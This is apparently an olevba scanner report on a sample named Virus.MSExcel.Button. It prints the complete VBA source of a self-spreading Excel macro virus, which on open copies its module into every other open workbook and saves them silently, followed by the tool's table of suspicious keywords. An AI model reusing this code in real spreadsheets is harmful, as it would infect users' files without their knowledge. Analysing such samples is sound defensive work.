olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Button
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: ./Virus.MSExcel.Button - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Button - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Button - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Button - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cmdButton.bas 
in file: ./Virus.MSExcel.Button - OLE stream: '_VBA_PROJECT_CUR/VBA/cmdButton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Private Sub RunChild()
    Dim cbar As CommandBar
    Dim cbarTool As CommandBarControl
    
    On Error Resume Next
    
        Set cbar = Application.CommandBars("Worksheet Menu Bar")
        If cbar.Controls(1).Tag <> "Happy" Then
            Set cbarTool = cbar.Controls.Add(msoControlButton, , , 1)
            With cbarTool
                .FaceId = 59
                .Tag = "Happy"
                .OnAction = ""
                .TooltipText = "Don't press this button"
                .Style = msoButtonIcon
            End With
        End If
End Sub

Private Sub Auto_Open()
    Reproduce
    RunChild
End Sub


Private Sub Reproduce()
    Dim wb As Workbook
    Dim wbAct As Workbook
    Dim i As Integer, boolAdd As Boolean
    
    On Error Resume Next
    Set wbAct = activeworkbook
    wbAct.VBProject.VBComponents.Item("cmdbutton").Export "C:\cmdbutton.bas"
    
    Application.DisplayAlerts = False
    For Each wb In Workbooks
        boolAdd = True
        If wb.Name <> wbAct.Name Then
            wb.VBProject.References.AddFromFile ("C:\Program Files\Common Files\Microsoft Shared\VBA\VBEext1.olb")
            
            For i = 1 To wb.VBProject.VBComponents.count
                If wb.VBProject.VBComponents(i).Name = "cmdButton" Then
                    boolAdd = False
                    Exit For
                End If
            Next i
            
            If boolAdd = True Then
                wb.VBProject.VBComponents.Import "C:\cmdbutton.bas"
            End If
        End If
        Application.ScreenUpdating = False
        wb.SAVE
        Application.ScreenUpdating = True
    Next wb
    Application.DisplayAlerts = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

